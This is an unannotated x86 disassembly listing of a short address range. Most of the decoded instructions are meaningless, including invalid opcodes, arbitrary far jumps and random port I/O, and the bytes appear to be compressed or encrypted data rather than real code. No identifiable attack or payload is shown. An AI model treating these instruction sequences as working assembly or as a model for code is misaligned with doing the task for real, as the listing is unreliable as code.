  404d96:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404d97:	e9 5e 0e 0f 4a       	jmp    0x4a4f5bfa
  404d9c:	e2 10                	loop   0x404dae
  404d9e:	0e                   	push   %cs
  404d9f:	e7 26                	out    %eax,$0x26
  404da1:	94                   	xchg   %eax,%esp
  404da2:	ea 1e b6 ba ab 9e 7f 	ljmp   $0x7f9e,$0xabbab61e
  404da9:	da 35 e1 82 42 e6    	fidivl 0xe64282e1
  404daf:	52                   	push   %edx
  404db0:	53                   	push   %ebx
  404db1:	de 34 de             	fidivs (%esi,%ebx,8)
  404db4:	9a 18 50 4f 1c 89 d1 	lcall  $0xd189,$0x1c4f5018
  404dbb:	cb                   	lret
  404dbc:	96                   	xchg   %eax,%esi
  404dbd:	c5 84 95 69 5e 35 5e 	lds    0x5e355e69(%ebp,%edx,4),%eax
  404dc4:	ac                   	lods   %ds:(%esi),%al
  404dc5:	52                   	push   %edx
  404dc6:	93                   	xchg   %eax,%ebx
  404dc7:	7c c6                	jl     0x404d8f
  404dc9:	d1 52 e3             	rcll   $1,-0x1d(%edx)
  404dcc:	1e                   	push   %ds
  404dcd:	d6                   	salc
  404dce:	bb e5 ef a0 7d       	mov    $0x7da0efe5,%ebx
  404dd3:	c5 f3 59 35 84 d6 a5 	vmulsd 0xe9a5d684,%xmm1,%xmm6
  404dda:	e9 
  404ddb:	35 61 ba 27 0f       	xor    $0xf27ba61,%eax
  404de0:	ee                   	out    %al,(%dx)
  404de1:	fe 07                	incb   (%edi)
  404de3:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404de4:	71 01                	jno    0x404de7
  404de6:	95                   	xchg   %eax,%ebp
  404de7:	88 71 62             	mov    %dh,0x62(%ecx)
  404dea:	2c 55                	sub    $0x55,%al
  404dec:	87 80 30 c2 09 4f    	xchg   %eax,0x4f09c230(%eax)
  404df2:	20 fb                	and    %bh,%bl
  404df4:	8e 1b                	mov    (%ebx),%ds
  404df6:	3c 20                	cmp    $0x20,%al
  404df8:	b6 c6                	mov    $0xc6,%dh
  404dfa:	77 a3                	ja     0x404d9f
  404dfc:	8a 4d 88             	mov    -0x78(%ebp),%cl
  404dff:	ea e2 92 0c 66 ac a7 	ljmp   $0xa7ac,$0x660c92e2
  404e06:	16                   	push   %ss
  404e07:	55                   	push   %ebp
  404e08:	2e 3d a3 9e f7 b7    	cs cmp $0xb7f79ea3,%eax
  404e0e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404e0f:	c6                   	(bad)
  404e10:	32 c9                	xor    %cl,%cl
  404e12:	30 8d 7c 84 c9 85    	xor    %cl,-0x7a367b84(%ebp)
  404e18:	5f                   	pop    %edi
  404e19:	b7 80                	mov    $0x80,%bh
  404e1b:	6c                   	insb   (%dx),%es:(%edi)
  404e1c:	8e 99 21 0d 51 92    	mov    -0x6daef2df(%ecx),%ds
  404e22:	90                   	nop
  404e23:	8e 30                	mov    (%eax),%?
  404e25:	d6                   	salc
  404e26:	cd 80                	int    $0x80
  404e28:	dd 9f 73 65 fa 64    	fstpl  0x64fa6573(%edi)
  404e2e:	3f                   	aas
  404e2f:	2e 8f                	cs (bad)
  404e31:	53                   	push   %ebx
  404e32:	e9 d8 f2 dc fc       	jmp    0xfd1d410f
  404e37:	8e 73 97             	mov    -0x69(%ebx),%?
  404e3a:	76 ba                	jbe    0x404df6
  404e3c:	ff c9                	dec    %ecx
  404e3e:	e2 6e                	loop   0x404eae
  404e40:	06                   	push   %es
  404e41:	69 60 4c 2b d7 46 27 	imul   $0x2746d72b,0x4c(%eax),%esp
  404e48:	b2 55                	mov    $0x55,%dl
  404e4a:	59                   	pop    %ecx
  404e4b:	07                   	pop    %es
  404e4c:	fc                   	cld
  404e4d:	5b                   	pop    %ebx
  404e4e:	0c de                	or     $0xde,%al
  404e50:	5c                   	pop    %esp
  404e51:	d4 e3                	aam    $0xe3
  404e53:	fd                   	std
  404e54:	70 dd                	jo     0x404e33
  404e56:	c5 fc 3e             	(bad)
  404e59:	e8 38 2e 84 12       	call   0x12c47c96
  404e5e:	01 1e                	add    %ebx,(%esi)
  404e60:	51                   	push   %ecx
  404e61:	a2 cf 68 e6 a3       	mov    %al,0xa3e668cf
  404e66:	22 4b 28             	and    0x28(%ebx),%cl
  404e69:	c7 06 0e 52 1f e4    	movl   $0xe41f520e,(%esi)
  404e6f:	4d                   	dec    %ebp
  404e70:	54                   	push   %esp
  404e71:	50                   	push   %eax
  404e72:	ef                   	out    %eax,(%dx)
  404e73:	ff                   	ljmp   (bad)
  404e74:	ec                   	in     (%dx),%al
  404e75:	3d 6f ae 20 58       	cmp    $0x5820ae6f,%eax
  404e7a:	36 fd                	ss std
  404e7c:	fa                   	cli
  404e7d:	a9 b8 37 18 31       	test   $0x311837b8,%eax
  404e82:	8e 83 d5 84 ed 36    	mov    0x36ed84d5(%ebx),%es
  404e88:	7a c7                	jp     0x404e51
  404e8a:	b0 b8                	mov    $0xb8,%al
  404e8c:	5d                   	pop    %ebp
  404e8d:	d2 7b 04             	sarb   %cl,0x4(%ebx)
  404e90:	22 34 54             	and    (%esp,%edx,2),%dh
  404e93:	ef                   	out    %eax,(%dx)
  404e94:	0b 3e                	or     (%esi),%edi
  404e96:	ee                   	out    %al,(%dx)
  404e97:	21 70 d8             	and    %esi,-0x28(%eax)
  404e9a:	68 9b 3b ea 98       	push   $0x98ea3b9b
  404e9f:	f8                   	clc
  404ea0:	fc                   	cld
  404ea1:	6e                   	outsb  %ds:(%esi),(%dx)
  404ea2:	9b                   	fwait
  404ea3:	8e 31                	mov    (%ecx),%?
  404ea5:	31 28                	xor    %ebp,(%eax)
  404ea7:	e1 2d                	loope  0x404ed6
  404ea9:	de 03                	fiadds (%ebx)
  404eab:	9a 5b 01 d1 18 0f e4 	lcall  $0xe40f,$0x18d1015b
  404eb2:	d3 1e                	rcrl   %cl,(%esi)
  404eb4:	d6                   	salc
  404eb5:	b4 c1                	mov    $0xc1,%ah
  404eb7:	a9 9d f3 e7 26       	test   $0x26e7f39d,%eax
  404ebc:	45                   	inc    %ebp
  404ebd:	5d                   	pop    %ebp
  404ebe:	3a 61 48             	cmp    0x48(%ecx),%ah
  404ec1:	f0 35 a3 0c 29 98    	lock xor $0x98290ca3,%eax
  404ec7:	2e f7 a4 6a f8 c4 83 	mull   %cs:0x83c4f8(%edx,%ebp,2)
  404ece:	00 
  404ecf:	20 75 36             	and    %dh,0x36(%ebp)
  404ed2:	41                   	inc    %ecx
  404ed3:	d1 35 0d 20 f8 88    	shll   $1,0x88f8200d
  404ed9:	33 87 94 6e 6f eb    	xor    -0x1490916c(%edi),%eax
  404edf:	57                   	push   %edi
  404ee0:	81 aa 5b ba 6b 4b 99 	subl   $0xc5522699,0x4b6bba5b(%edx)
  404ee7:	26 52 c5 
  404eea:	20 da                	and    %bl,%dl
  404eec:	79 d4                	jns    0x404ec2
  404eee:	ff 0a                	decl   (%edx)
  404ef0:	71 96                	jno    0x404e88
  404ef2:	45                   	inc    %ebp
  404ef3:	05 84 6d 9e 8b       	add    $0x8b9e6d84,%eax
  404ef8:	6c                   	insb   (%dx),%es:(%edi)
  404ef9:	2f                   	das
  404efa:	1c 2d                	sbb    $0x2d,%al
  404efc:	bb 3d ee 34 59       	mov    $0x5934ee3d,%ebx
  404f01:	f2 55                	repnz push %ebp
  404f03:	0a dc                	or     %ah,%bl
  404f05:	6c                   	insb   (%dx),%es:(%edi)
  404f06:	38 a2 9d 56 17 f5    	cmp    %ah,-0xae8a963(%edx)
  404f0c:	08 a9 a2 e4 a2 9a    	or     %ch,-0x655d1b5e(%ecx)
  404f12:	9f                   	lahf
  404f13:	6e                   	outsb  %ds:(%esi),(%dx)
  404f14:	53                   	push   %ebx
  404f15:	2c 81                	sub    $0x81,%al
  404f17:	ad                   	lods   %ds:(%esi),%eax
  404f18:	31 de                	xor    %ebx,%esi
  404f1a:	be a6 d9 fd ff       	mov    $0xfffdd9a6,%esi
  404f1f:	1e                   	push   %ds
  404f20:	d8 53 98             	fcoms  -0x68(%ebx)
  404f23:	b4 ad                	mov    $0xad,%ah
  404f25:	78 09                	js     0x404f30
  404f27:	ff 47 8f             	incl   -0x71(%edi)
  404f2a:	d0 15 39 f0 bb 11    	rclb   $1,0x11bbf039
  404f30:	d9 c5                	fld    %st(5)
  404f32:	92                   	xchg   %eax,%edx
  404f33:	b1 f3                	mov    $0xf3,%cl
  404f35:	a3 c3 fd 5c e3       	mov    %eax,0xe35cfdc3
  404f3a:	8f                   	(bad)
  404f3b:	cb                   	lret
  404f3c:	bb ea d4 27 6c       	mov    $0x6c27d4ea,%ebx
  404f41:	e7 9b                	out    %eax,$0x9b
  404f43:	21 3d be 02 63 2f    	and    %edi,0x2f6302be
  404f49:	27                   	daa
  404f4a:	43                   	inc    %ebx
  404f4b:	47                   	inc    %edi
  404f4c:	d6                   	salc
  404f4d:	28 ef                	sub    %ch,%bh
  404f4f:	75 0d                	jne    0x404f5e
  404f51:	90                   	nop
  404f52:	b0 28                	mov    $0x28,%al
  404f54:	cd c6                	int    $0xc6
  404f56:	7a 94                	jp     0x404eec
  404f58:	7e a6                	jle    0x404f00
  404f5a:	7d 4c                	jge    0x404fa8
  404f5c:	f1                   	int1
  404f5d:	1f                   	pop    %ds
  404f5e:	4b                   	dec    %ebx
  404f5f:	81 8d d8 1d b4 33 99 	orl    $0x3ebc0099,0x33b41dd8(%ebp)
  404f66:	00 bc 3e 
  404f69:	61                   	popa
  404f6a:	8c 46 f9             	mov    %es,-0x7(%esi)
  404f6d:	52                   	push   %edx
  404f6e:	f8                   	clc
  404f6f:	72 6f                	jb     0x404fe0
  404f71:	38 55 c7             	cmp    %dl,-0x39(%ebp)
  404f74:	fe                   	(bad)
  404f75:	91                   	xchg   %eax,%ecx
  404f76:	22 39                	and    (%ecx),%bh
  404f78:	5b                   	pop    %ebx
  404f79:	43                   	inc    %ebx
  404f7a:	0c da                	or     $0xda,%al
  404f7c:	47                   	inc    %edi
  404f7d:	7e 66                	jle    0x404fe5
  404f7f:	86 d5                	xchg   %dl,%ch
  404f81:	ba 9b 19 78 bc       	mov    $0xbc78199b,%edx
  404f86:	bb 81 76 f0 70       	mov    $0x70f07681,%ebx
  404f8b:	4a                   	dec    %edx
  404f8c:	cb                   	lret
  404f8d:	5e                   	pop    %esi
  404f8e:	50                   	push   %eax
  404f8f:	2b 88 04 ea 16 ae    	sub    -0x51e915fc(%eax),%ecx
  404f95:	f7 00 a2 1a 2b ef    	testl  $0xef2b1aa2,(%eax)
  404f9b:	8f                   	(bad)
  404f9c:	10 f1                	adc    %dh,%cl
  404f9e:	c5 ef 5a 29          	vcvtsd2ss (%ecx),%xmm2,%xmm5
  404fa2:	7d 92                	jge    0x404f36
  404fa4:	0d b3 13 56 fb       	or     $0xfb5613b3,%eax
  404fa9:	a1 4c a0 55 39       	mov    0x3955a04c,%eax
  404fae:	8e d2                	mov    %edx,%ss
  404fb0:	79 df                	jns    0x404f91
  404fb2:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404fb3:	01 e2                	add    %esp,%edx
  404fb5:	c2 c1 a0             	ret    $0xa0c1
  404fb8:	b7 08                	mov    $0x8,%bh
  404fba:	b7 ff                	mov    $0xff,%bh
  404fbc:	43                   	inc    %ebx
  404fbd:	0d 7d 5d fd e6       	or     $0xe6fd5d7d,%eax
  404fc2:	55                   	push   %ebp
  404fc3:	07                   	pop    %es
  404fc4:	cd 49                	int    $0x49
  404fc6:	89 13                	mov    %edx,(%ebx)
  404fc8:	84 b3 2b d2 6c 34    	test   %dh,0x346cd22b(%ebx)
  404fce:	96                   	xchg   %eax,%esi
  404fcf:	82 ef 29             	sub    $0x29,%bh
  404fd2:	9c                   	pushf
  404fd3:	53                   	push   %ebx
  404fd4:	21 fc                	and    %edi,%esp
  404fd6:	49                   	dec    %ecx
  404fd7:	e4 da                	in     $0xda,%al
  404fd9:	a1 5f 6a 2e ba       	mov    0xba2e6a5f,%eax
  404fde:	4c                   	dec    %esp
  404fdf:	d0 80 c3 33 dc ae    	rolb   $1,-0x5123cc3d(%eax)
  404fe5:	57                   	push   %edi
  404fe6:	39 b9 0c 45 41 a8    	cmp    %edi,-0x57bebaf4(%ecx)
  404fec:	27                   	daa
  404fed:	31 62 03             	xor    %esp,0x3(%edx)
  404ff0:	e9 f6 5b 96 c3       	jmp    0xc3d6abeb
  404ff5:	3f                   	aas
  404ff6:	bb f5 77 72 92       	mov    $0x927277f5,%ebx
  404ffb:	db 8f 3c c9 13 dd    	fisttpl -0x22ec36c4(%edi)
  405001:	f0 73 c7             	lock jae 0x404fcb
  405004:	ff 21                	jmp    *(%ecx)
  405006:	ee                   	out    %al,(%dx)
  405007:	16                   	push   %ss
  405008:	9e                   	sahf
  405009:	5e                   	pop    %esi
  40500a:	e9 ed e7 12 41       	jmp    0x415337fc
  40500f:	b1 eb                	mov    $0xeb,%cl
  405011:	5e                   	pop    %esi
  405012:	23 4c 73 5b          	and    0x5b(%ebx,%esi,2),%ecx
  405016:	f3 0b 98 39 73 8a e2 	repz or -0x1d758cc7(%eax),%ebx
  40501d:	82 36 cb             	xorb   $0xcb,(%esi)
  405020:	86 90 6f 5f 8c 5d    	xchg   %dl,0x5d8c5f6f(%eax)
  405026:	04 7a                	add    $0x7a,%al
  405028:	93                   	xchg   %eax,%ebx
  405029:	23 a9 57 c6 d7 7e    	and    0x7ed7c657(%ecx),%ebp
  40502f:	4a                   	dec    %edx
  405030:	07                   	pop    %es
  405031:	fe                   	(bad)
  405032:	71 55                	jno    0x405089
  405034:	f6 2a                	imulb  (%edx)
  405036:	95                   	xchg   %eax,%ebp
  405037:	d4 0a                	aam    $0xa
  405039:	bd 9f e8 3a a7       	mov    $0xa73ae89f,%ebp
  40503e:	c3                   	ret
  40503f:	3d a1 99 93 f3       	cmp    $0xf39399a1,%eax
  405044:	49                   	dec    %ecx
  405045:	fd                   	std
  405046:	ea f4 76 c5 67 2b 05 	ljmp   $0x52b,$0x67c576f4
  40504d:	05 dc d4 8d f5       	add    $0xf58dd4dc,%eax
  405052:	b3 44                	mov    $0x44,%bl
  405054:	82 41 4f ee          	addb   $0xee,0x4f(%ecx)
  405058:	10 43 61             	adc    %al,0x61(%ebx)
  40505b:	bf 04 90 01 3c       	mov    $0x3c019004,%edi
  405060:	20 ab d8 0d ad c4    	and    %ch,-0x3b52f228(%ebx)
  405066:	bd 71 0c d7 92       	mov    $0x92d70c71,%ebp
  40506b:	50                   	push   %eax
  40506c:	f1                   	int1
  40506d:	11 a2 be c9 f5 ae    	adc    %esp,-0x510a3642(%edx)
  405073:	7f e4                	jg     0x405059
  405075:	9d                   	popf
  405076:	ad                   	lods   %ds:(%esi),%eax
  405077:	cd 9e                	int    $0x9e
  405079:	4e                   	dec    %esi
  40507a:	4a                   	dec    %edx
  40507b:	38 e2                	cmp    %ah,%dl
  40507d:	db 5a e4             	fistpl -0x1c(%edx)
  405080:	dd 63 c1             	frstor -0x3f(%ebx)
  405083:	e7 0e                	out    %eax,$0xe
  405085:	79 26                	jns    0x4050ad
  405087:	8e d8                	mov    %eax,%ds
  405089:	0f d4 2c 71          	paddq  (%ecx,%esi,2),%mm5
  40508d:	37                   	aaa
  40508e:	19 33                	sbb    %esi,(%ebx)
  405090:	73 a0                	jae    0x405032
  405092:	0a e2                	or     %dl,%ah
  405094:	c2 76 98             	ret    $0x9876
  405097:	d0 54 14 1f          	rclb   $1,0x1f(%esp,%edx,1)
  40509b:	ad                   	lods   %ds:(%esi),%eax
  40509c:	50                   	push   %eax
  40509d:	e7 8d                	out    %eax,$0x8d
  40509f:	ad                   	lods   %ds:(%esi),%eax
  4050a0:	ae                   	scas   %es:(%edi),%al
  4050a1:	38 e1                	cmp    %ah,%cl
  4050a3:	6c                   	insb   (%dx),%es:(%edi)
  4050a4:	04 93                	add    $0x93,%al
  4050a6:	a9 3a 64 ee fe       	test   $0xfeee643a,%eax
  4050ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4050ac:	a1 b2 da 73 25       	mov    0x2573dab2,%eax
  4050b1:	bd ca 36 22 60       	mov    $0x602236ca,%ebp
  4050b6:	4a                   	dec    %edx
  4050b7:	71 0f                	jno    0x4050c8
  4050b9:	ae                   	scas   %es:(%edi),%al
  4050ba:	a8 d5                	test   $0xd5,%al
  4050bc:	77 47                	ja     0x405105
  4050be:	8d 49 a1             	lea    -0x5f(%ecx),%ecx
  4050c1:	31 60 c0             	xor    %esp,-0x40(%eax)
  4050c4:	12 ac 30 60 a1 80 fb 	adc    -0x47f5ea0(%eax,%esi,1),%ch
  4050cb:	b2 1a                	mov    $0x1a,%dl
  4050cd:	66 00 37             	data16 add %dh,(%edi)
  4050d0:	51                   	push   %ecx
  4050d1:	98                   	cwtl
  4050d2:	d9 36                	fnstenv (%esi)
  4050d4:	58                   	pop    %eax
  4050d5:	0c 7d                	or     $0x7d,%al
  4050d7:	d5 f8                	aad    $0xf8
  4050d9:	3f                   	aas
  4050da:	c1 75 00 9e          	shll   $0x9e,0x0(%ebp)
  4050de:	a2 aa 34 8b ce       	mov    %al,0xce8b34aa
  4050e3:	9c                   	pushf
  4050e4:	fe 4f c4             	decb   -0x3c(%edi)
  4050e7:	57                   	push   %edi
  4050e8:	56                   	push   %esi
  4050e9:	ca c0 53             	lret   $0x53c0
  4050ec:	4a                   	dec    %edx
  4050ed:	61                   	popa
  4050ee:	55                   	push   %ebp
  4050ef:	47                   	inc    %edi
  4050f0:	38 60 d8             	cmp    %ah,-0x28(%eax)
  4050f3:	17                   	pop    %ss
  4050f4:	df 4e 84             	fisttps -0x7c(%esi)
  4050f7:	eb 99                	jmp    0x405092
  4050f9:	e4 ba                	in     $0xba,%al
  4050fb:	a0 4b 78 63 db       	mov    0xdb63784b,%al
  405100:	b8 e1 fc 16 fc       	mov    $0xfc16fce1,%eax
  405105:	ec                   	in     (%dx),%al
  405106:	c8 8a 09 20          	enter  $0x98a,$0x20
  40510a:	de 1d fa 4a 57 5d    	ficomps 0x5d574afa
  405110:	92                   	xchg   %eax,%edx
  405111:	c9                   	leave
  405112:	a8 dd                	test   $0xdd,%al
  405114:	65 56                	gs push %esi
  405116:	d8 61 6f             	fsubs  0x6f(%ecx)
  405119:	56                   	push   %esi
  40511a:	49                   	dec    %ecx
  40511b:	6f                   	outsl  %ds:(%esi),(%dx)
  40511c:	36 7f e9             	ss jg  0x405108
  40511f:	39 81 8b 89 2a c5    	cmp    %eax,-0x3ad57675(%ecx)
  405125:	f1                   	int1
  405126:	6c                   	insb   (%dx),%es:(%edi)
  405127:	c8 69 a5 a8          	enter  $0xa569,$0xa8
  40512b:	9f                   	lahf
  40512c:	34 3e                	xor    $0x3e,%al
  40512e:	3e 7b c2             	jnp,pt 0x4050f3
  405131:	74 df                	je     0x405112
  405133:	cd c1                	int    $0xc1
  405135:	a8 ec                	test   $0xec,%al
  405137:	8a 85 1c 75 a4 96    	mov    -0x695b8ae4(%ebp),%al
  40513d:	65 a0 27 ac 8a 35    	mov    %gs:0x358aac27,%al
  405143:	60                   	pusha
  405144:	0f 04                	(bad)
  405146:	0c 13                	or     $0x13,%al
  405148:	52                   	push   %edx
  405149:	e4 d9                	in     $0xd9,%al
  40514b:	da ef                	(bad)
  40514d:	ed                   	in     (%dx),%eax
  40514e:	50                   	push   %eax
  40514f:	90                   	nop
  405150:	98                   	cwtl
  405151:	6f                   	outsl  %ds:(%esi),(%dx)
  405152:	83 4a 98 2c          	orl    $0x2c,-0x68(%edx)
  405156:	6a 4a                	push   $0x4a
  405158:	d3 fa                	sar    %cl,%edx
  40515a:	73 b1                	jae    0x40510d
  40515c:	43                   	inc    %ebx
  40515d:	0f 34                	sysenter
  40515f:	8d                   	lea    (bad),%eax
  405160:	c3                   	ret
  405161:	16                   	push   %ss
  405162:	2a 59 20             	sub    0x20(%ecx),%bl
  405165:	3f                   	aas
  405166:	7e 97                	jle    0x4050ff
  405168:	6f                   	outsl  %ds:(%esi),(%dx)
  405169:	bf 07 a8 52 d5       	mov    $0xd552a807,%edi
  40516e:	bd 41 1f e8 dc       	mov    $0xdce81f41,%ebp
  405173:	c1 43 d7 e4          	roll   $0xe4,-0x29(%ebx)
  405177:	31 ca                	xor    %ecx,%edx
  405179:	f8                   	clc
  40517a:	6d                   	insl   (%dx),%es:(%edi)
  40517b:	30 f8                	xor    %bh,%al
  40517d:	9a 99 96 3a 7e b3 2a 	lcall  $0x2ab3,$0x7e3a9699
  405184:	24 71                	and    $0x71,%al
  405186:	2d 32 0c 13 1e       	sub    $0x1e130c32,%eax
  40518b:	1b a0 b8 05 b8 46    	sbb    0x46b805b8(%eax),%esp
  405191:	20 e3                	and    %ah,%bl
  405193:	08 70 71             	or     %dh,0x71(%eax)
  405196:	48                   	dec    %eax
  405197:	8b 40 72             	mov    0x72(%eax),%eax
  40519a:	26 c2 37 2b          	es ret $0x2b37
  40519e:	22 cd                	and    %ch,%cl
  4051a0:	75 2b                	jne    0x4051cd
  4051a2:	48                   	dec    %eax
  4051a3:	10 6b 92             	adc    %ch,-0x6e(%ebx)
  4051a6:	bf ce 61 17 5c       	mov    $0x5c1761ce,%edi
  4051ab:	4e                   	dec    %esi
  4051ac:	44                   	inc    %esp
  4051ad:	23 c8                	and    %eax,%ecx
  4051af:	49                   	dec    %ecx
  4051b0:	53                   	push   %ebx
  4051b1:	c8 0e b7 a5          	enter  $0xb70e,$0xa5
  4051b5:	41                   	inc    %ecx
  4051b6:	87 83 85 d5 5d 0d    	xchg   %eax,0xd5dd585(%ebx)
  4051bc:	59                   	pop    %ecx
  4051bd:	05 51 e1 33 fd       	add    $0xfd33e151,%eax
  4051c2:	c2 b3 75             	ret    $0x75b3
  4051c5:	ad                   	lods   %ds:(%esi),%eax
  4051c6:	62 62 25             	bound  %esp,0x25(%edx)
  4051c9:	b5 17                	mov    $0x17,%ch
  4051cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4051cc:	08 cc                	or     %cl,%ah
  4051ce:	03 37                	add    (%edi),%esi
  4051d0:	5d                   	pop    %ebp
  4051d1:	4c                   	dec    %esp
  4051d2:	b4 3f                	mov    $0x3f,%ah
  4051d4:	4d                   	dec    %ebp
  4051d5:	51                   	push   %ecx
  4051d6:	10 19                	adc    %bl,(%ecx)
  4051d8:	10 de                	adc    %bl,%dh
  4051da:	2a 07                	sub    (%edi),%al
  4051dc:	b8 6e 70 b1 2a       	mov    $0x2ab1706e,%eax
  4051e1:	20 a3 d9 3e 9f a2    	and    %ah,-0x5d60c127(%ebx)
  4051e7:	97                   	xchg   %eax,%edi
  4051e8:	07                   	pop    %es
  4051e9:	ce                   	into
  4051ea:	ae                   	scas   %es:(%edi),%al
  4051eb:	ba 23 a5 55 66       	mov    $0x6655a523,%edx
  4051f0:	3f                   	aas
  4051f1:	a2 ff 2e c2 b8       	mov    %al,0xb8c22eff
  4051f6:	da 26                	fisubl (%esi)
  4051f8:	51                   	push   %ecx
  4051f9:	44                   	inc    %esp
  4051fa:	1b d2                	sbb    %edx,%edx
  4051fc:	b3 12                	mov    $0x12,%bl
  4051fe:	1c 86                	sbb    $0x86,%al
  405200:	79 a0                	jns    0x4051a2
  405202:	e0 7c                	loopne 0x405280
  405204:	c3                   	ret
  405205:	eb a5                	jmp    0x4051ac
  405207:	a8 d2                	test   $0xd2,%al
  405209:	16                   	push   %ss
  40520a:	07                   	pop    %es
  40520b:	af                   	scas   %es:(%edi),%eax
  40520c:	98                   	cwtl
  40520d:	42                   	inc    %edx
  40520e:	1c 84                	sbb    $0x84,%al
  405210:	6b 6a 12 ed          	imul   $0xffffffed,0x12(%edx),%ebp
  405214:	a2 27 f6 67 5e       	mov    %al,0x5e67f627
  405219:	3d 47 0d 5b f0       	cmp    $0xf05b0d47,%eax
  40521e:	53                   	push   %ebx
  40521f:	49                   	dec    %ecx
  405220:	ab                   	stos   %eax,%es:(%edi)
  405221:	61                   	popa
  405222:	20 24 34             	and    %ah,(%esp,%esi,1)
  405225:	61                   	popa
  405226:	c4 74 62 dd          	les    -0x23(%edx,%eiz,2),%esi
  40522a:	f8                   	clc
  40522b:	82 f5 03             	xor    $0x3,%ch
  40522e:	c9                   	leave
  40522f:	f6 ac d9 59 7a 3f b3 	imulb  -0x4cc085a7(%ecx,%ebx,8)
  405236:	37                   	aaa
  405237:	58                   	pop    %eax
  405238:	22 8e 2a 01 87 9c    	and    -0x6378fed6(%esi),%cl
  40523e:	35 c5 4a 96 35       	xor    $0x35964ac5,%eax
  405243:	6c                   	insb   (%dx),%es:(%edi)
  405244:	bd 85 4b 87 f2       	mov    $0xf2874b85,%ebp
  405249:	83 a7 a8 f2 60 64 b0 	andl   $0xffffffb0,0x6460f2a8(%edi)
  405250:	e0 87                	loopne 0x4051d9
  405252:	60                   	pusha
  405253:	ca 0a 62             	lret   $0x620a
  405256:	d9 39                	fnstcw (%ecx)
  405258:	81 ba 4a 65 60 18 40 	cmpl   $0xcbb95640,0x1860654a(%edx)
  40525f:	56 b9 cb 
  405262:	40                   	inc    %eax
  405263:	89 64 86 d4          	mov    %esp,-0x2c(%esi,%eax,4)
  405267:	bd f4 79 90 32       	mov    $0x329079f4,%ebp
  40526c:	31 04 3b             	xor    %eax,(%ebx,%edi,1)
  40526f:	ea 87 af eb bb ef b2 	ljmp   $0xb2ef,$0xbbebaf87
  405276:	02 bc 5f 19 cb d2 04 	add    0x4d2cb19(%edi,%ebx,2),%bh
  40527d:	12 43 3b             	adc    0x3b(%ebx),%al
  405280:	1c d2                	sbb    $0xd2,%al
  405282:	8f                   	(bad)
  405283:	11 52 74             	adc    %edx,0x74(%edx)
  405286:	76 ae                	jbe    0x405236
  405288:	b5 1e                	mov    $0x1e,%ch
  40528a:	e5 95                	in     $0x95,%eax
  40528c:	a8 49                	test   $0x49,%al
  40528e:	68 e2 c6 30 5f       	push   $0x5f30c6e2
  405293:	f7 03 8f cc de 26    	testl  $0x26decc8f,(%ebx)
  405299:	dd ed                	fucomp %st(5)
  40529b:	a2 c7 80 ca 92       	mov    %al,0x92ca80c7
  4052a0:	5b                   	pop    %ebx
  4052a1:	c6                   	(bad)
  4052a2:	67 28 9f 26 72       	sub    %bl,0x7226(%bx)
  4052a7:	b0 6f                	mov    $0x6f,%al
  4052a9:	90                   	nop
  4052aa:	56                   	push   %esi
  4052ab:	d4 8b                	aam    $0x8b
  4052ad:	b6 cd                	mov    $0xcd,%dh
  4052af:	6c                   	insb   (%dx),%es:(%edi)
  4052b0:	c7                   	(bad)
  4052b1:	b2 0d                	mov    $0xd,%dl
  4052b3:	5f                   	pop    %edi
  4052b4:	d5 28                	aad    $0x28
  4052b6:	3c d8                	cmp    $0xd8,%al
  4052b8:	b6 3c                	mov    $0x3c,%dh
  4052ba:	d4 67                	aam    $0x67
  4052bc:	46                   	inc    %esi
  4052bd:	99                   	cltd
  4052be:	6a b3                	push   $0xffffffb3
  4052c0:	07                   	pop    %es
  4052c1:	e3 a7                	jecxz  0x40526a
  4052c3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4052c4:	e1 d8                	loope  0x40529e
  4052c6:	b7 60                	mov    $0x60,%bh
  4052c8:	8e f6                	mov    %esi,%?
  4052ca:	37                   	aaa
  4052cb:	b4 a7                	mov    $0xa7,%ah
  4052cd:	ca 3d 98             	lret   $0x983d
  4052d0:	d5 5f                	aad    $0x5f
  4052d2:	c7                   	(bad)
  4052d3:	0f ca                	bswap  %edx
  4052d5:	ae                   	scas   %es:(%edi),%al
  4052d6:	43                   	inc    %ebx
  4052d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d8:	da 13                	ficoml (%ebx)
  4052da:	18 e8                	sbb    %ch,%al
  4052dc:	0c 08                	or     $0x8,%al
  4052de:	a2 b5 8a d8 2a       	mov    %al,0x2ad88ab5
  4052e3:	23 a5 af 5f 1e 42    	and    0x421e5faf(%ebp),%esp
  4052e9:	32 38                	xor    (%eax),%bh
  4052eb:	8e 8c 1a b3 99 05 d9 	mov    -0x26fa664d(%edx,%ebx,1),%cs
  4052f2:	63 e2                	arpl   %esp,%edx
  4052f4:	91                   	xchg   %eax,%ecx
  4052f5:	8b fd                	mov    %ebp,%edi
  4052f7:	b5 30                	mov    $0x30,%ch
  4052f9:	b3 97                	mov    $0x97,%bl
  4052fb:	db 6c c4 d5          	fldt   -0x2b(%esp,%eax,8)
  4052ff:	94                   	xchg   %eax,%esp
  405300:	63 2d 35 32 43 98    	arpl   %ebp,0x98433235
  405306:	1d ff 9c 7a 94       	sbb    $0x947a9cff,%eax
  40530b:	fe                   	(bad)
  40530c:	20 e1                	and    %ah,%cl
  40530e:	b0 5e                	mov    $0x5e,%al
  405310:	ab                   	stos   %eax,%es:(%edi)
  405311:	c9                   	leave
  405312:	71 fa                	jno    0x40530e
  405314:	20 65 1d             	and    %ah,0x1d(%ebp)
  405317:	23 7c ec f2          	and    -0xe(%esp,%ebp,8),%edi
  40531b:	9a b8 59 4c fa f9 27 	lcall  $0x27f9,$0xfa4c59b8
  405322:	18 26                	sbb    %ah,(%esi)
  405324:	32 e9                	xor    %cl,%ch
  405326:	bc 7f bf f0 a0       	mov    $0xa0f0bf7f,%esp
  40532b:	f2 fb                	repnz sti
  40532d:	fb                   	sti
  40532e:	f1                   	int1
  40532f:	ba e9 f1 41 e6       	mov    $0xe641f1e9,%edx
  405334:	6c                   	insb   (%dx),%es:(%edi)
  405335:	ae                   	scas   %es:(%edi),%al
  405336:	8a fe                	mov    %dh,%bh
  405338:	49                   	dec    %ecx
  405339:	92                   	xchg   %eax,%edx
  40533a:	26 b8 eb d2 82 0f    	es mov $0xf82d2eb,%eax
  405340:	e2 ca                	loop   0x40530c
  405342:	78 b5                	js     0x4052f9
